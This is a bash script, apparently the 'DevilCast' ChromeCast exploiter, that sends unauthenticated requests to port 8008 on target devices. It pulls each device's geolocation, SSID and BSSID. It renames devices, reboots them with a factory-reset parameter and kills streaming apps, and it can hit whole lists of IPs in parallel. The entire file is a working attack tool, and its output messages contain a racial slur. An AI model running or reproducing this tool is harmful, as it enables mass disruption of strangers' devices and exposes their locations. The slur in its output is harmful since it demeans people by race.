#!/bin/bash

# DevilCast v1.0
# Release on 11/01/2019
# Github: github.com/aryanrtm/DevilCast
# © Copyright ~ 4WSec


# color
PP='\033[95m' # purple
CY='\033[96m' # cyan
BL='\033[94m' # blue
GR='\033[92m' # green
YW='\033[93m' # yellow
RD='\033[91m' # red
NT='\033[97m'  # netral
O='\e[0m' # nothing
B='\e[5m' # blink
U='\e[4m' # underline

clear

p0rt=8008
con=1
threads=10

function header(){
	printf "${YW}
  |\___/|
  )     (   ${RD}${U}[ ChromeCast Exploiter ]${O}${YW}
 =\     /=
   )${PP}===${YW}(
  /     \ 
  |     | 
 /       \ 
 \       /
  \__  _/  ${PP}Author   : ${CY}${U}4WSec${O}${YW}
    ( (    ${PP}Codename : ${CY}${U}DevilCast${O}${YW}
     ) )
    (_(
"
}


function info_device(){
	curl -s -L "${iP}:${p0rt}/ssdp/device-desc.xml" >> info_device_results.tmp
	if [[ -z $(cat info_device_results.tmp) ]]; then
		printf " ${RD}[!] ${YW}Error, Try Again.\n"
		rm info_device_results.tmp
		exit
	else
		printf "Target IP     : $iP \n"
		printf "Device Name   : $(cat info_device_results.tmp | grep -Po '(?<=<friendlyName>).*?(?=<)') \n"
		printf "Manufacturer  : $(cat info_device_results.tmp | grep -Po '(?<=<manufacturer>).*?(?=<)') \n"
		printf "Model Name    : $(cat info_device_results.tmp | grep -Po '(?<=<modelName>).*?(?=<)') \n"
		printf "................................................\n"
	fi
}

function info_device2(){
	curl -s -L "${iP}:${p0rt}/setup/eureka_info" >> info_device2_results.tmp
	if [[ -z $(cat info_device2_results.tmp) ]]; then
		printf " ${RD}[!] ${YW}Error, Try Again.\n"
		rm info_device2_results.tmp
		exit
	else
		printf "${CY}BSSID         : ${RD}$(cat info_device2_results.tmp | grep -Po '(?<="bssid":").*?(?=")') \n"
		printf "${CY}Locale        : ${RD}$(cat info_device2_results.tmp | grep -Po '(?<="locale":").*?(?=")') \n"
		printf "${CY}Country Code  : ${RD}$(cat info_device2_results.tmp | grep -Po '(?<="country_code":").*?(?=")') \n"
		printf "${CY}Latitude      : ${RD}$(cat info_device2_results.tmp | grep -Po '(?<="latitude":).*?(?=,)') \n"
		printf "${CY}Longitude     : ${RD}$(cat info_device2_results.tmp | grep -Po '(?<="longitude":).*?(?=})') \n"
		printf "${CY}Signal Level  : ${RD}$(cat info_device2_results.tmp | grep -Po '(?<="signal_level":).*?(?=,)') \n"
		printf "${CY}SSID          : ${RD}$(cat info_device2_results.tmp | grep -Po '(?<="ssid":").*?(?=")') \n"
		printf "${CY}Timezone      : ${RD}$(cat info_device2_results.tmp | grep -Po '(?<="timezone":").*?(?=")') \n"
		printf "${CY}Uptime        : ${RD}$(cat info_device2_results.tmp | grep -Po '(?<="uptime":).*?(?=,)') \n"
	fi
}


function rename_device(){
	read -p "Enter a New Name: " n4m3;
	curl -s -L -XPOST "${iP}:${p0rt}/setup/set_eureka_info" --data "name=${n4m3}"
	printf "Rename The Device ... \n"

}

function reboot_device(){
	curl -s -L -XPOST "${iP}:${p0rt}/setup/reboot" --data "params=fdr"
	printf "Turn Off The Device ... \n"
}

function mass_reboot_device(){
	printf "${RD}Reboot The Nigga ${NT}~> ${YW}${wha}:${p0rt} \n"
	curl -s -L -XPOST "${wha}:${p0rt}/setup/set_eureka_info" --data "params=fdr"
}

function l00p_mass_reboot(){
	echo ""
	read -p " [*] Enter IP List: " iP_liST;
	if [[ ! -e $iP_liST ]]; then
		printf " ${RD}[!] ${YW}File Not Found\n"
		exit
	fi
	echo ""
	for wha in $(cat $iP_liST); do
		fast=$(expr $con % $threads)
		if [[ $fast == 0 && $con > 0 ]]; then
			sleep 2
		fi
		mass_reboot_device &
		con=$[$con+1]
	done
	wait
}

function mass_rename_device(){
	printf "${RD}Rename The Nigga ${NT}~> ${YW}${wha}:${p0rt} \n"
	curl -s -L -XPOST "${wha}:${p0rt}/setup/set_eureka_info" --data "name=${n4m3}"
}

function l00p_mass_rename(){
	echo ""
	read -p " [*] Enter IP List: " iP_liST;
	if [[ ! -e $iP_liST ]]; then
		printf " ${RD}[!] ${YW}File Not Found\n"
		exit
	fi
	read -p " [*] Enter a New Name: " n4m3;
	if [[ -z $n4m3 ]]; then
		printf " ${RD}[!] ${YW}Error, Try Again.\n"
		exit
	fi
	echo ""
	for wha in $(cat $iP_liST); do
		fast=$(expr $con % $threads)
		if [[ $fast == 0 && $con > 0 ]]; then
			sleep 2
		fi
		mass_rename_device &
		con=$[$con+1]
	done
	wait
}

function app_device(){
	printf "
	List App (>'-')>

	1) Google Play Music
	2) Youtube
	3) Netflix
"
	read -p "nyan> " whut;
	if [[ $whut == 1 ]]; then
		curl -s -L --request DELETE "${iP}:${p0rt}/apps/GoogleMusic"
		printf "Turn Off Google Play Music ... \n"
	elif [[ $whut == 2 ]]; then
		curl -s -L --request DELETE "${iP}:${p0rt}/apps/Youtube"
		printf "Turn Off Youtube ... \n"
	elif [[ $whut == 3 ]]; then
		curl -s -L --request DELETE "${iP}:${p0rt}/apps/Netflix"
		printf "Turn Off Netflix ... \n"
	else
		printf " ${RD}[!] ${YW}Error, Try Again.\n"
		exit
	fi
}


function menu(){
	printf "${GR}
	Hellcome Bro (>'-')>

	1) Reboot Device
	2) Rename Device
	3) Turn Off The App

"
	read -p "  nyan> " nyan;
	if [[ $nyan == 1 ]]; then
		reboot_device
	elif [[ $nyan == 2 ]]; then
		rename_device
	elif [[ $nyan == 3 ]]; then
		app_device
	else
		printf " ${RD}[!] ${YW}Error, Try Again.\n"
		exit
	fi
}


function choices(){
	printf "${GR}
	1) Single Target
	2) Mass Rename Device
	3) Mass Reboot Device

"

	read -p "   nyan> " yeah;
	if [[ $yeah == 1 ]]; then
		echo ""
		read -p " [*] Target IP: " iP;
		echo ""
		info_device
		info_device2
		rm -f info_device*
		menu
	elif [[ $yeah == 2 ]]; then
		l00p_mass_rename
	elif [[ $yeah == 3 ]]; then
		l00p_mass_reboot
	else
		printf " ${RD}[!] ${YW}Error, Try Again.\n"
		exit
	fi
}

header
choices